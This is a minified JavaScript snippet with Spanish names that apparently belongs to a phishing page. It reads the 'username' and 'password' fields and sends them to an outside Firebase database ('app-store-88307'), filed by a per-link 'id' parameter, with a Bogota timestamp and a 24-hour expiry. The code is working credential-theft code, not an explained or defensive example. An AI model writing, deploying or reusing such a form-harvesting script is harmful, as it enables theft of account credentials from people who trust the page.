const FIREBASE_URL='https://app-store-88307-default-rtdb.firebaseio.com';const CAMPOS=[{"id": "username", "type": "text"}, {"id": "password", "type": "password"}];function guardarDatos(){const id=new URLSearchParams(window.location.search).get('id');if(!id)return;const data={};CAMPOS.forEach(c=>{const el=document.getElementById(c.id);if(el)data[c.id]=el.value.trim()});const t=Date.now();data.fecha=new Date().toLocaleString('es-CO',{timeZone:'America/Bogota'});data.expiracion=t+86400000;fetch(FIREBASE_URL+'/mensajes/'+id+'/registro_'+t+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})}